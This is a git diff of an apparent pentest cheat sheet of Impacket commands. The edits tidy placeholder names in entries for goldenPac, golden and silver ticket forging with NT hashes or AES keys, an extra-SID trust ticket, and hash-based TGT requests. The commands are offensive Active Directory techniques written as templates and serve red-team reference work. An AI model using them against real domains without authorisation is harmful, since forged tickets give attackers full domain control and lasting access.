@@ -47,7 +47,7 @@ impacket-goldenPac -dc-ip <DC-IP> <DOMAIN>/'<USER>':'<PASSWORD>'@<target>
 ## Ticketer - (golden ticket) - generate TGT/TGS tickets into ccache format which can be converted further into kirbi.
 #plateform/linux #target/local  #cat/ATTACK/EXPLOIT
 ```
-impacket-ticketer -nthash <nthash> -domain-sid <domain_sid> -domain <DOMAIN> <randomuser>
+impacket-ticketer -nthash <nthash> -domain-sid <domain-sid> -domain <DOMAIN> <randomuser>
 ```
 
 ## Ticketer - (golden ticket) - with an AES 128/256bits key
@@ -59,25 +59,25 @@ impacket-ticketer -aesKey "<krbtgtAESkey>" -domain-sid "<domainSID>" -domain "<D
 ## Ticketer - (golden ticket) - with an RC4 key, i.e. NT hash with custom user/groups ids
 #plateform/linux #target/local  #cat/ATTACK/EXPLOIT
 ```
-impacket-ticketer -nthash "<krbtgtNThash>" -domain-sid "<domainSID>" -domain "<DOMAIN>" -user-id "<USERID>" -groups "<GROUPS-ID>" "<randomuser>"
+impacket-ticketer -nthash "<krbtgtNThash>" -domain-sid "<domainSID>" -domain "<DOMAIN>" -user-id "<USER-ID>" -groups "<GROUPS-ID>" "<randomuser>"
 ```
 
 ## Ticketer - Generate golden ticket with extra SID
 
 ```
-impacket-ticketer -nthash "<HASH>" -domain-sid "<domain_SID>" -domain "<domain_FQDN>" -extra-sid "<target_domain_SID-RID>" "<someusername>"
+impacket-ticketer -nthash "<hash>" -domain-sid "<domain-sid>" -domain "<domain-FQDN>" -extra-sid "<target_domain_SID-RID>" "<someusername>"
 ```
 
-# 1. forge the referral ticket
+# 1. Trust - forge the referral ticket
 ```
-impacket-ticketer -nthash "<HASH>" -domain-sid "<domain_SID>" -domain "<domain_FQDN>" -extra-sid "<target_domain_SID-RID>" -spn "krbtgt/<domain_FQDN>" "someusername"
+impacket-ticketer -nthash "<hash>" -domain-sid "<domain-sid>" -domain "<domain-FQDN>" -extra-sid "<target_domain_SID-RID>" -spn "krbtgt/<domain-FQDN>" "someusername"
 ```
 
 
 ## Ticketer - (silver ticket) - generate TGS tickets into ccache format which can be converted further into kirbi.
 #plateform/linux #target/local  #cat/ATTACK/EXPLOIT
 ```
-impacket-ticketer -nthash <nthash> -domain-sid <domain_sid> -domain <DOMAIN> -spn <SPN> <USER>
+impacket-ticketer -nthash <hash> -domain-sid <domain-sid> -domain <DOMAIN> -spn <SPN> <USER>
 ```
 
 ## Ticketer - (silver ticket) - with an AES (128 or 256 bits) key
@@ -101,7 +101,7 @@ impacket-getST -spn cifs/<target> <DOMAIN>/<netbios_name>\$ -impersonate <USER>
 ## GetTGT - request a TGT and save it as ccache for given a password, hash or aesKey
 #plateform/linux #target/remote  #cat/UTILS
 ```
-impacket-getTGT -dc-ip <DC-IP> -hashes <lm_hash>:<nt_hash> <DOMAIN>/<USER>
+impacket-getTGT -dc-ip <DC-IP> -hashes <hash> <DOMAIN>/<USER>
 ```
 
 ## GetADUser - gather data about the domain’s users and their corresponding email addresses
